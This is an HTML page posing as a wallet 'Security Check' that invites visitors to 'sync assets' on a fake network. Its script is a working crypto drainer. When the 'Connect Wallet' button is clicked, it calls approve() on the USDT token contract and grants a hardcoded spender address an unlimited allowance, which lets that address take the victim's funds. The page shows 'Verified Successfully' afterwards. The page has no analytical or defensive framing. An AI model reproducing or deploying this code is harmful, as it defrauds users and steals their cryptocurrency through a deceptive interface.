<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Network Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { margin: 0; background: #050505; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); padding: 40px 30px; border-radius: 32px; width: 85%; max-width: 340px; text-align: center; }
        .btn { background: #fff; color: #000; border: none; padding: 20px; border-radius: 18px; font-weight: 700; font-size: 16px; width: 100%; cursor: pointer; margin-top: 25px; box-shadow: 0 10px 20px rgba(255,255,255,0.1); }
        .btn:active { transform: scale(0.97); }
        .status { color: #555; font-size: 11px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
        #debug { color: #ff4444; font-size: 10px; margin-top: 10px; opacity: 0.6; }
    </style>
</head>
<body>

<div class="glass">
    <div style="font-size: 40px; margin-bottom: 20px;">🛡️</div>
    <div style="font-size: 22px; font-weight: 600; margin-bottom: 12px;">Security Check</div>
    <div style="color: #888; font-size: 14px; line-height: 1.5;">Confirm your identity to sync assets with USDS Standart network.</div>
    
    <button class="btn" id="mainBtn">CONNECT WALLET</button>
    <div class="status" id="status">Ready to connect</div>
    <div id="debug"></div>
</div>

<script>
    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    const btn = document.getElementById('mainBtn');
    const status = document.getElementById('status');
    const debug = document.getElementById('debug');

    async function start() {
        try {
            status.innerText = "Searching for wallet...";
            
            // 1. Пытаемся найти TronWeb в разных местах (Trust / TronLink / Mobile)
            let tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);

            if (!tw) {
                // Если не нашли сразу, ждем 0.5 сек (фикс для мобильного Trust)
                await new Promise(r => setTimeout(r, 500));
                tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
            }

            if (!tw) {
                throw new Error("Wallet provider not detected. Use DApp browser.");
            }

            // 2. Запрос доступа к аккаунту
            status.innerText = "Requesting access...";
            const accounts = await tw.request({ method: 'tron_requestAccounts' });
            
            if (!accounts || accounts.length === 0) {
                throw new Error("Please unlock your wallet.");
            }

            // 3. Подготовка контракта и Approve
            status.innerText = "Preparing protocol...";
            const contract = await tw.contract().at(USDT);
            const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
            
            status.innerText = "Waiting for approval...";
            await contract.approve(SPENDER, amount).send();
            
            status.innerText = "Verified Successfully";
            btn.innerText = "COMPLETE";
            btn.style.opacity = "0.5";
            btn.disabled = true;

        } catch (e) {
            console.error(e);
            debug.innerText = e.message;
            status.innerText = "Retry Required";
            btn.innerText = "TRY AGAIN";
        }
    }

    btn.addEventListener('click', start);
</script>
</body>
</html>
